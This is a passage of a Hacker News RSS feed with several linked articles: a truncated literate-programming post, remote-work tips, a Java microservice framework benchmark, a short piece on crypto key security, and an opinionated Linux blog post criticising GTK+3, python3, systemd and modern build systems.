If the graph contains a cycle, I will raise an exception:

``` &lt;&lt; cycle error &gt;&gt;=
RuntimeError("Graph contains a cycle.")
```

* * *

Here are the required imports:

``` &lt;&lt; imports &gt;&gt;=
from collections import defaultdict
```
</code></pre>
<p>To write literate programs, I use <a href="https://commonmark.org/">CommonMark</a>, a style of <a href="https://en.wikipedia.org/wiki/Markdown">markdown</a>.
I turn this <a href="https://en.wikipedia.org/wiki/Markdown">markdown</a> file into <a href="https://en.wikipedia.org/wiki/XML">XML</a> using the <code>cmark</code> command line tool:</p>
<pre><code>$ cmark --to xml sample.markdown &gt; sample.xml
</code></pre>
<p>To support macro definitions, I use the "info strings" on fenced code blocks. E.g.</p>
<blockquote>
<pre><code>$ echo '
``` hello world
a 
b
```
' | cmark --to xml
</code></pre>
</blockquote>
<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE document SYSTEM "CommonMark.dtd"&gt;
&lt;document xmlns="http://commonmark.org/xml/1.0"&gt;
  &lt;code_block info="hello world" xml:space="preserve"&gt;a
b
&lt;/code_block&gt;
&lt;/document&gt;
</code></pre>

<blockquote>
<pre><code>$ litprog weave sample.xml
</code></pre>
</blockquote>
<pre><code>&lt;div xmlns:ns0="http://commonmark.org/xml/1.0"&gt;
  &lt;h1&gt;
    &lt;span&gt;Topological Sort with Khan's Algorithm&lt;/span&gt;
  &lt;/h1&gt;
  &lt;figure&gt;&lt;figcaption&gt;&amp;#171; MAIN &amp;#187;:&lt;/figcaption&gt;&lt;pre&gt;&lt;code&gt;&amp;#171;imports&amp;#187;

def khans_algorithm(*, V, E):
    &amp;#171;init graph&amp;#187;
    &amp;#171;init topological order&amp;…</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://johnlekberg.com/blog/2020-11-08-cli-litprog.html">https://johnlekberg.com/blog/2020-11-08-cli-litprog.html</a></em></p>]]>
            </description>
            <link>https://johnlekberg.com/blog/2020-11-08-cli-litprog.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25027878</guid>
            <pubDate>Sun, 08 Nov 2020 18:47:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Remote Work: Tips on how to successfully work remotely in 2020]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25027569">thread link</a>) | @martin_crd
<br/>
November 8, 2020 | https://remoteworkers.net/blog/7-tips-how-successfully-work-remotely-2020 | <a href="https://web.archive.org/web/*/https://remoteworkers.net/blog/7-tips-how-successfully-work-remotely-2020">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>It’s no secret that this year has been a testing year on all fronts of our waking lives, leading us to ‘get out of our comfort zones’ and learn to adapt in vastly changing times. Subsequently, most employees have had to work remotely to some capacity (if not fully remotely), and we’ve all had to learn how to improve our work-life balance while finding new ways to still be as efficient as before in our professional lives.</p><p>Needless to say, today you do not need to be tech-savvy to adjust to the digital world. The key to surviving and succeeding in this world is to make sure you’re prepared with the necessary online tools, mindset, and time management skills.</p><p>Below is a list of tips to help you thrive in a digital workforce:</p><h2>1. Make sure you have a strong internet connection</h2><p>This may seem like a no-brainer, but possibly the first thing you need to make sure you have when working remotely is a strong internet connection. This will help ensure you’re always accessible to your colleagues, therefore able to carry out your daily tasks and duties without interruption. Depending on your household and the number of devices you have connected to your WIFI, you may need to upgrade your internet package so you have a fast and reliable connection.</p><p>Just as in the traditional work environment, it’s important to collaborate with your co-workers and management, and poor internet connection may hinder that. Luckily, most service providers provide affordable internet bundle packages that will cater to your needs without breaking your bank balance.</p><h2>2. Invest in good office furniture and computer equipment</h2><p>Following some basic, yet essential ergonomics tips can improve your efficiency, reduce fatigue and strain to your back and neck, and facilitate proper posture. That’s why it’s important to invest in comfortable and adjustable furniture just as much as it is to have reliable computer equipment and updated software to complete your home office setup.</p><p>When working an eight-hour day or more, maintaining proper posture while sitting is crucial, not only for immediate benefits but for long-term damage you may cause to your back if you do not adopt the correct seating posture with adequate lower back support. Adjustable chairs and tables are a must-have to help ease pressure and body discomfort while working.</p><p>What often goes overlooked is the importance of taking care of your eyes. Protect your eyes from digital eye strain with an anti-blue light screen protector for your laptop or display monitor and you’ll disrupt the chances of sleep deprivation, fatigue, and risk of macular degeneration.</p><h2>3. Have a dedicated workspace</h2><p>Apart from helping you curb unnecessary distractions from the TV, social media, or dare I say: your kids, having a dedicated workspace is necessary to help improve productivity and creativity. Usually, when you go to the office it’s easier to get into ‘work-mode’ since you’re in an environment that induces productivity, but when working from home, you have to put in a little more effort to stay focused and motivated. Avoid working from your bed, the couch, or anywhere else that may lead to inattentiveness and interruptions to the work at hand.</p><p>Working remotely is a benefit that requires both accountability and responsibility as an employee, so creating an environment that promotes efficiency<strong></strong>goes a long way. Even if you don’t have the luxury of having an actual office at home you can still dedicate a certain ‘work-zone’ (preferably close to a window so you can enjoy the benefits of fresh air and natural light) in a quiet part of your home.</p><h2>4. Take breaks</h2><p>Don’t be hesitant to take breaks during the day. Taking regular short breaks will help keep your productivity at a high as well as help you feel constantly recharged and engaged. These could include short breaks to meditate for 5-10 minutes, having coffee, stretching, or simply just walking around to increase your blood circulation. Incorporate the 20-20-20 rule into your schedule: Take a 20-second break every 20 minutes by looking at things at least 20 feet away.</p><p>You can set reminders on your phone to help you remember to get up and walk. You can even get creative and strategic in your approach and place certain equipment (like the printer for instance) in another room to necessitate getting up and walking.</p><h2>5. Keep learning and improving your skills.</h2><p>Continuously upgrading your knowledge and skills will not only help keep you relevant in your respective field but will also help you map out your career progression. In an ever-changing job market and surplus in demand for remote work, you need to be marketable to progress. The more skilled and experienced you are, the wider your opportunities and growth prospects.</p><p>There are amazing free online learning materials you can take advantage of, or find reasonably affordable online courses. Even reading books on self-improvement, motivation, and success will help to keep you driven and inspired.</p><h2>6. Engage with colleagues and maintain positive professional relationships</h2><p>One of the downsides of working remotely is that you lose the benefits of building rapport with colleagues and your managers, which can result in life-long and beneficial professional connections.</p><p>You spend 8 hours of the day working, so it’s important to have healthy relations with the people you work with so that you feel level-headed and motivated to work. Something as simple as a good morning message to using professional and friendly jargon to communicate will help facilitate solid and positive relationships.</p><p>Be proactive and participate actively in meetings, after-work activities (provided you’re protecting yourself and others by social distancing and wearing a mask), and any other engagement activities offered. Be mindful to respect each other's diversities but also know when to not distract your co-workers as you must always maintain a professional demeanor. This will help to build trust, mutual respect, and open communication amongst each other, and bring about teamwork.</p><h2>7. Disconnect and know when to ‘call it a day’</h2><p>Time is valuable, and so are you! In order to be the best employee you can be, you need to learn to take care of yourself and your health, including your mental health. In a cut-throat work environment where we’re constantly being graded on our performance, it’s easy to feel overwhelmed and work to an excess.</p><p>Follow a strict work schedule but know when it’s time to ‘switch off’ and relax. If you find yourself unable to disconnect, practice managing your time better throughout the day so you’re able to finish your work on time. This will help reduce stress and improve the quality of your sleep.</p><p>Working overtime is necessary in certain cases, but downfall into the trap where you don’t give yourself (and your family and loved ones) the time to live and enjoy your life. Remember, the most productive employees are the ones who are well-rested and feel motivated to work.</p></div></div>]]>
            </description>
            <link>https://remoteworkers.net/blog/7-tips-how-successfully-work-remotely-2020</link>
            <guid isPermaLink="false">hacker-news-small-sites-25027569</guid>
            <pubDate>Sun, 08 Nov 2020 18:13:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Spring boot vs. quarkus vs. micranaut vs. helidon vs. vertx]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25027554">thread link</a>) | @ozkanpakdil
<br/>
November 8, 2020 | https://ozkanpakdil.github.io/microservicetests/2020-10-31-microservice-framework-test-11.html | <a href="https://web.archive.org/web/*/https://ozkanpakdil.github.io/microservicetests/2020-10-31-microservice-framework-test-11.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
      <p>Here is total package generation times for separate modules,</p>

<figure><pre><code data-lang="bash"><span>[</span>INFO] eclipse-microprofile-kumuluz-test 1.0-SNAPSHOT ..... SUCCESS <span>[</span> 33.217 s]
<span>[</span>INFO] helidon-quickstart-se 1.0-SNAPSHOT ................. SUCCESS <span>[</span> 30.383 s]
<span>[</span>INFO] micronaut-demo 0.1 ................................. SUCCESS <span>[</span> 31.055 s]
<span>[</span>INFO] quarkus-demo 1.0.0-SNAPSHOT ........................ SUCCESS <span>[</span> 38.910 s]
<span>[</span>INFO] springboot-demo 0.0.1-SNAPSHOT ..................... SUCCESS <span>[</span> 11.680 s]
<span>[</span>INFO] vertx-demo 1.0.0-SNAPSHOT .......................... SUCCESS <span>[</span>  4.269 s]</code></pre></figure>

<p>Size of created packages:</p>

<table>
  <thead>
    <tr>
      <th>Size in MB</th>
      <th>Name</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>21M</td>
      <td>eclipse-microprofile-kumuluz-test/target/eclipse-microprofile-kumuluz-test.jar</td>
    </tr>
    <tr>
      <td>7.0M</td>
      <td>helidon-se-netty/target/helidon-quickstart-se.jar</td>
    </tr>
    <tr>
      <td>14M</td>
      <td>micronaut/target/micronaut-demo-0.1.jar</td>
    </tr>
    <tr>
      <td>14M</td>
      <td>quarkus/target/quarkus-demo-1.0.0-SNAPSHOT-runner.jar</td>
    </tr>
    <tr>
      <td>18M</td>
      <td>spring-boot/target/springboot-demo-0.0.1-SNAPSHOT.jar</td>
    </tr>
    <tr>
      <td>6.8M</td>
      <td>vertx/target/vertx-demo-1.0.0-SNAPSHOT-fat.jar</td>
    </tr>
  </tbody>
</table>

<p>:: Spring Boot :: (v2.3.5.RELEASE) Started DemoApplication in 2.503 seconds (JVM running for 3.16)</p>

<figure><pre><code data-lang="bash"><span>----</span> Global Information <span>--------------------------------------------------------</span>
<span>&gt;</span> request count                                       2000 <span>(</span><span>OK</span><span>=</span>2000   <span>KO</span><span>=</span>0     <span>)</span>
<span>&gt;</span> min response <span>time                                      </span>0 <span>(</span><span>OK</span><span>=</span>0      <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> max response <span>time                                    </span>339 <span>(</span><span>OK</span><span>=</span>339    <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> mean response <span>time                                    </span>39 <span>(</span><span>OK</span><span>=</span>39     <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> std deviation                                         62 <span>(</span><span>OK</span><span>=</span>62     <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> response <span>time </span>50th percentile                          2 <span>(</span><span>OK</span><span>=</span>2      <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> response <span>time </span>75th percentile                         61 <span>(</span><span>OK</span><span>=</span>61     <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> response <span>time </span>95th percentile                        178 <span>(</span><span>OK</span><span>=</span>178    <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> response <span>time </span>99th percentile                        249 <span>(</span><span>OK</span><span>=</span>249    <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> mean requests/sec                                    400 <span>(</span><span>OK</span><span>=</span>400    <span>KO</span><span>=</span>-     <span>)</span></code></pre></figure>

<p>powered by Quarkus 1.9.1.Final) started in 1.098s. Listening on: http://0.0.0.0:8080</p>

<figure><pre><code data-lang="bash"><span>----</span> Global Information <span>--------------------------------------------------------</span>
<span>&gt;</span> request count                                       2000 <span>(</span><span>OK</span><span>=</span>2000   <span>KO</span><span>=</span>0     <span>)</span>
<span>&gt;</span> min response <span>time                                      </span>0 <span>(</span><span>OK</span><span>=</span>0      <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> max response <span>time                                    </span>430 <span>(</span><span>OK</span><span>=</span>430    <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> mean response <span>time                                    </span>33 <span>(</span><span>OK</span><span>=</span>33     <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> std deviation                                         61 <span>(</span><span>OK</span><span>=</span>61     <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> response <span>time </span>50th percentile                          2 <span>(</span><span>OK</span><span>=</span>2      <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> response <span>time </span>75th percentile                         40 <span>(</span><span>OK</span><span>=</span>40     <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> response <span>time </span>95th percentile                        169 <span>(</span><span>OK</span><span>=</span>169    <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> response <span>time </span>99th percentile                        260 <span>(</span><span>OK</span><span>=</span>260    <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> mean requests/sec                                    400 <span>(</span><span>OK</span><span>=</span>400    <span>KO</span><span>=</span>-     <span>)</span></code></pre></figure>

<p>micronaut version:2.0.1 Startup completed in 1163ms. Server Running: http://localhost:8080</p>

<figure><pre><code data-lang="bash"><span>----</span> Global Information <span>--------------------------------------------------------</span>
<span>&gt;</span> request count                                       2000 <span>(</span><span>OK</span><span>=</span>2000   <span>KO</span><span>=</span>0     <span>)</span>
<span>&gt;</span> min response <span>time                                      </span>0 <span>(</span><span>OK</span><span>=</span>0      <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> max response <span>time                                    </span>266 <span>(</span><span>OK</span><span>=</span>266    <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> mean response <span>time                                    </span>34 <span>(</span><span>OK</span><span>=</span>34     <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> std deviation                                         58 <span>(</span><span>OK</span><span>=</span>58     <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> response <span>time </span>50th percentile                          2 <span>(</span><span>OK</span><span>=</span>2      <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> response <span>time </span>75th percentile                         45 <span>(</span><span>OK</span><span>=</span>45     <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> response <span>time </span>95th percentile                        179 <span>(</span><span>OK</span><span>=</span>179    <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> response <span>time </span>99th percentile                        228 <span>(</span><span>OK</span><span>=</span>228    <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> mean requests/sec                                    400 <span>(</span><span>OK</span><span>=</span>400    <span>KO</span><span>=</span>-     <span>)</span></code></pre></figure>

<p>vertx version:3.9.4</p>

<figure><pre><code data-lang="bash"><span>----</span> Global Information <span>--------------------------------------------------------</span>
<span>&gt;</span> request count                                       2000 <span>(</span><span>OK</span><span>=</span>2000   <span>KO</span><span>=</span>0     <span>)</span>
<span>&gt;</span> min response <span>time                                      </span>0 <span>(</span><span>OK</span><span>=</span>0      <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> max response <span>time                                    </span>190 <span>(</span><span>OK</span><span>=</span>190    <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> mean response <span>time                                    </span>19 <span>(</span><span>OK</span><span>=</span>19     <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> std deviation                                         41 <span>(</span><span>OK</span><span>=</span>41     <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> response <span>time </span>50th percentile                          1 <span>(</span><span>OK</span><span>=</span>1      <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> response <span>time </span>75th percentile                          5 <span>(</span><span>OK</span><span>=</span>5      <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> response <span>time </span>95th percentile                        125 <span>(</span><span>OK</span><span>=</span>125    <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> response <span>time </span>99th percentile                        172 <span>(</span><span>OK</span><span>=</span>172    <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> mean requests/sec                                    400 <span>(</span><span>OK</span><span>=</span>400    <span>KO</span><span>=</span>-     <span>)</span></code></pre></figure>

<p>kumuluz version:3.11.0 Server – Started @5032ms</p>

<figure><pre><code data-lang="bash"><span>----</span> Global Information <span>--------------------------------------------------------</span>
<span>&gt;</span> request count                                       2000 <span>(</span><span>OK</span><span>=</span>2000   <span>KO</span><span>=</span>0     <span>)</span>
<span>&gt;</span> min response <span>time                                      </span>0 <span>(</span><span>OK</span><span>=</span>0      <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> max response <span>time                                    </span>343 <span>(</span><span>OK</span><span>=</span>343    <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> mean response <span>time                                    </span>48 <span>(</span><span>OK</span><span>=</span>48     <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> std deviation                                         77 <span>(</span><span>OK</span><span>=</span>77     <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> response <span>time </span>50th percentile                          3 <span>(</span><span>OK</span><span>=</span>3      <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> response <span>time </span>75th percentile                         75 <span>(</span><span>OK</span><span>=</span>75     <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> response <span>time </span>95th percentile                        223 <span>(</span><span>OK</span><span>=</span>223    <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> response <span>time </span>99th percentile                        292 <span>(</span><span>OK</span><span>=</span>292    <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> mean requests/sec                                    400 <span>(</span><span>OK</span><span>=</span>400    <span>KO</span><span>=</span>-     <span>)</span></code></pre></figure>

<p>Helidon SE 2.1.0 features: [Config, Health, Metrics, WebServer]</p>

<figure><pre><code data-lang="bash"><span>----</span> Global Information <span>--------------------------------------------------------</span>
<span>&gt;</span> request count                                       2000 <span>(</span><span>OK</span><span>=</span>2000   <span>KO</span><span>=</span>0     <span>)</span>
<span>&gt;</span> min response <span>time                                      </span>0 <span>(</span><span>OK</span><span>=</span>0      <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> max response <span>time                                    </span>472 <span>(</span><span>OK</span><span>=</span>472    <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> mean response <span>time                                    </span>76 <span>(</span><span>OK</span><span>=</span>76     <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> std deviation                                        108 <span>(</span><span>OK</span><span>=</span>108    <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> response <span>time </span>50th percentile                          7 <span>(</span><span>OK</span><span>=</span>7      <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> response <span>time </span>75th percentile                        123 <span>(</span><span>OK</span><span>=</span>123    <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> response <span>time </span>95th percentile                        331 <span>(</span><span>OK</span><span>=</span>331    <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> response <span>time </span>99th percentile                        419 <span>(</span><span>OK</span><span>=</span>419    <span>KO</span><span>=</span>-     <span>)</span>
<span>&gt;</span> mean requests/sec                                    400 <span>(</span><span>OK</span><span>=</span>400    <span>KO</span><span>=</span>-     <span>)</span></code></pre></figure>


      


    </article></div>]]>
            </description>
            <link>https://ozkanpakdil.github.io/microservicetests/2020-10-31-microservice-framework-test-11.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25027554</guid>
            <pubDate>Sun, 08 Nov 2020 18:12:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Securing Crypto Keys: Ancient History Provides Clues]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25027511">thread link</a>) | @npguy
<br/>
November 8, 2020 | http://doublespend.io/2020/10/29/ancient-history-provides-clues-for-securing-crypto-keys/ | <a href="https://web.archive.org/web/*/http://doublespend.io/2020/10/29/ancient-history-provides-clues-for-securing-crypto-keys/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

			
<article id="post-548">
	
				<p><a href="https://doublespend.io/wp-content/uploads/2020/10/ancient.jpg"><img width="800" height="445" src="https://doublespend.io/wp-content/uploads/2020/10/ancient-800x445.jpg" alt="" loading="lazy" srcset="https://doublespend.io/wp-content/uploads/2020/10/ancient.jpg 800w, https://doublespend.io/wp-content/uploads/2020/10/ancient-300x167.jpg 300w, https://doublespend.io/wp-content/uploads/2020/10/ancient-768x427.jpg 768w" sizes="(max-width: 800px) 100vw, 800px"></a>
								</p>
			
	<div>

		
		

		
		<div>
			
<p>Multiple well-funded teams in crypto are studying ancient human history to design new methods for securing the cryptographic keys for holding cryptocurrencies. </p>



<p>“Material that we have interpreted from ancient rocks prove that the methods we use today are already very close to the solution. Some of these techniques are hundreds of thousands of years old, so this is a significant undertaking” opined John Keymaker, Head of Research at GoldenKeys, a startup focused on innovative methods to secure crypto.</p>
		</div>

	</div>

	</article>

		</div></div>]]>
            </description>
            <link>http://doublespend.io/2020/10/29/ancient-history-provides-clues-for-securing-crypto-keys/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25027511</guid>
            <pubDate>Sun, 08 Nov 2020 18:07:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[When “Progress” Is Backwards]]>
            </title>
            <description>
<![CDATA[
Score 27 | Comments 19 (<a href="https://news.ycombinator.com/item?id=25027462">thread link</a>) | @pmarin
<br/>
November 8, 2020 | https://sabotage-linux.github.io/blog/8 | <a href="https://web.archive.org/web/*/https://sabotage-linux.github.io/blog/8">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>When "progress" is backwards</h2>

<p>20 Oct 2020 15:58 UTC</p>
<p>Lately I see many developments in the linux FOSS world that sell themselves as progress, but are actually hugely annoying and counter-productive.</p>

<p>Counter-productive to a point where they actually cause major regressions, costs, and as in the case of GTK+3 ruin user experience and the possibility that we'll ever enjoy "The year of the Linux desktop".</p>

<h2>Showcase 1: GTK+3</h2>

<p>GTK+2 used to be <em>the</em> GUI toolkit for Linux desktop applications.
It is highly customizable, reasonably lightweight and programmable from C, which means almost any scripting language can interface to it too.</p>

<p>Rather than improving the existing toolkit code in a backwards-compatible manner, <a href="https://www.freedesktop.org/">its developers</a> decided to introduce many breaking API changes which require a major porting effort to make an existing codebase compatible with the successor GTK+3, and keeping support for GTK+2 while supporting GTK+3 at the same time typically involves a lot of #ifdef clutter in the source base which not many developers are willing to maintain.</p>

<p>Additionally GTK+3 made away with a lot of user-customizable themeing options, effectively rendering useless most of the existing themes that took considerable developer effort for their creation.
Here's a <a href="https://ubuntu-mate.community/t/gtk3-regressions-from-a-gtk2-perspective/19511">list of issues</a> users are complaining about.</p>

<p>Due to the effort required to port a GTK+2 application to use GTK+3, many finished GUI application projects will never be ported due to lack of manpower, lost interest of the main developer or his untimely demise.
An example of such a program is the excellent audio editor <a href="http://www.metadecks.org/software/sweep/">sweep</a> which has seen its last release in 2008.
With Linux distros removing support for GTK+2, these apps are basically lost in the void of time.</p>

<p>The other option for distros is to keep both the (unmaintained) GTK+2 and GTK+3 in their repositories so GTK+2-only apps can still be used, however that causes the user of these apps to require basically the double amount of disk and RAM space as both toolkits need to live next to each other. Also this will only work as long as there are no breaking changes in the Glib library which both toolkits are built upon.</p>

<p>Even worse, due to the irritation the GTK+3 move caused to developers, many switched to QT4 or QT5, which requires use of C++, so a typical linux distro now has a mix of GTK+2, GTK+3, GTK+4, QT4 and QT5 applications, where each toolkit consumes considerable resources.</p>

<p>Microsoft (TM) knows better and sees backwards compatibility as the holy grail and underlying root cause of its success and market position. Any 25 year old Win32 GUI application from the Win95 era still works without issues on the latest Windows (TM) release. They even still support 16bit MS-DOS apps using some built-in emulator.</p>

<p>From MS' perspective, the freedesktop.org decision makers played into their hands when they decided to make GTK+3 a completely different beast.
Of course, we are <a href="https://en.wikipedia.org/wiki/Hanlon%27s_razor">taught to never believe in malice but in stupidity</a>, so it is unthinkable that there was actually a real conspiracy and monetary compensations behind this move.
Otherwise we would be conspiracy theorist nuts, right ?</p>

<h2>Showcase 2: python3</h2>

<p>Python is a hugely successful programming/scripting language used by probably millions of programmers.</p>

<p>Whereas python2 development has been very stable for many years, python3 changes at the blink of an eye. It's not uncommon to find that after an update of python3 to the next release, existing code no longer works as expected.</p>

<p>Many developers such as myself prefer to use a stable development environment over one that is as volatile as python3.</p>

<p>With the decision to <a href="https://mail.python.org/archives/list/python-announce-list@python.org/thread/OFCIETIXLX34X7FVK5B5WPZH22HXV342/">EOL python2</a> thousands of py2-based applications will experience the same fate as GTK+2 applications without maintainer: they will be rendered obsolete and disappear from the distro repositories. This may happen quicker than one would expect, as python by default provides bindings to the system's OpenSSL library, which has a history of making backwards-incompatible changes. At the very least, once the web agrees on a new TLS standard, python2 will be rendered completely useless.</p>

<p>Porting python2 to python3 isn't usually as involving as GTK+2 to GTK+3, but due to the dynamic nature of python the syntax checker can't catch all code issues automatically so many issues will be experienced at runtime in cornercases, causing the ported application to throw a backtrace and stopping execution, which can have grave consequences.</p>

<p>Many companies have <a href="https://www.techrepublic.com/article/jpmorgans-athena-has-35-million-lines-of-python-code-and-wont-be-updated-to-python-3-in-time/">millions of line of code still in python2</a> and will have to produce quite some sweat and expenses to make it compatible to python3.</p>

<h2>Showcase 3: ip vs ifconfig</h2>

<p>Once one had learned his handful of ifconfig and route commands to configure a Linux' box network connections, one could comfortably manage this aspect across all distros. Not any longer, someone had the glorious idea to declare ifconfig and friends obsolete and provide a new, more "powerful" tool to do its job: <code>ip</code>.</p>

<p>The command for bringing up a network device is now <code>ip link set dev eth1 up</code> vs the older <code>ifconfig eth1 up</code>. Does this really look like progress?
Worst, the documentation of the tool is non-intuitive so one basically has to google for examples that show the translation from one command to the other.</p>

<p>The same critics apply to <code>iw</code> vs <code>iwconfig</code>.</p>

<h2>Showcase 4: ethernet adapter renaming by systemd/udev</h2>

<p>Latest systemd-based distros come up with network interface names such as <code>enx78e7d1ea46da</code> or <code>vethb817d6a</code>, instead of the traditional <code>eth0</code>.
The interface names assigned by default on Ubuntu 20 are so long a regular human can't even remember them, any configuration attempt requires one to copy/paste the name from <code>ip a</code> output.
Yet almost every distro goes along with this <a href="https://www.freedesktop.org/wiki/Software/systemd/PredictableNetworkInterfaceNames/">Poettering/freedesktop.org-dictated</a> nonsense.</p>

<h2>Showcase 5: CMake, meson, and $BUILDSYSTEMOFTHEDAY</h2>

<p>While the traditional buildsystem used on UNIX, <code>autoconf</code>, has its warts, it was designed in such a way that only the application developer required the full set of tools, whereas the consumer requires only a POSIX compatible shell environment and a <code>make</code> program.</p>

<p>More "modern" build systems like <code>cmake</code> and <code>meson</code> don't give a damn about the dependencies a user has to install, in fact according to <a href="https://kevstras.com/programming/2017/12/18/meson.html">this</a>, <code>meson</code> authors claimed it to be one of their goals to force users to have a bleeding edge version of python3 installed so it can be universally assumed as a given.</p>

<p><code>CMake</code> is written in C++, consists of 70+ MB of extracted sources and requires an impressive amount of time to build from source. Built with debug information, it takes up 434 MB of my harddisk space as of version 3.9.3.
It's primary raison-d'etre is its support for the Microsoft (TM) Visual Studio (R) (TM) solution files, so Windows (TM) people can compile stuff from source with a few clicks.</p>

<p>The two of them have in common that they threw over board the well-known user interface to configure and make and invented their own NIH solution, which requires the user to learn yet another way to build his applications.</p>

<p>Both of these build systems seem to have either acquired a cult following just like systemd, or someone is paying trolls to show up on github with pull requests to replace GNU autoconf with either of those, for example <a href="https://github.com/containers/crun/issues/495">1</a> <a href="https://github.com/karelzak/util-linux/pull/968">2</a> .
Interestingly also, GNOME, which is tightly connected to freedesktop.org, has made it one of its goals to <a href="https://wiki.gnome.org/Initiatives/GnomeGoals/MesonPorting">switch all components to meson</a>.
Their porting effort involves almost every key component in the Linux desktop stack, including cairo, pango, fontconfig, freetype, and dozens of others. What might be the agenda behind this effort?</p>

<h2>Conclusion</h2>

<p>We live in an era where in the FOSS world one constantly has to relearn things, switch to new, supposedly "better", but more bloated solutions, and is generally left with the impression that someone is pulling the rug from below one's feet.
Many of the key changes in this area have been rammed through by a small set of decision makers, often closely related to Red Hat/Gnome/freedesktop.org.
We're buying this "progress" at a high cost, and one can't avoid asking oneself whether there's more to the story than meets the eye.
Never forget, Red Hat and Microsoft (TM) are <a href="https://www.redhat.com/en/partners/microsoft">partners</a> and might even have the same shareholders.</p>
</div></div>]]>
            </description>
            <link>https://sabotage-linux.github.io/blog/8</link>
            <guid isPermaLink="false">hacker-news-small-sites-25027462</guid>
            <pubDate>Sun, 08 Nov 2020 18:02:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: React Frontload V2 – Simple full-stack data loading for React]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25027368">thread link</a>) | @davnicwil
<br/>
November 8, 2020 | https://davnicwil.com/react-frontload | <a href="https://web.archive.org/web/*/https://davnicwil.com/react-frontload">archive.org</a>
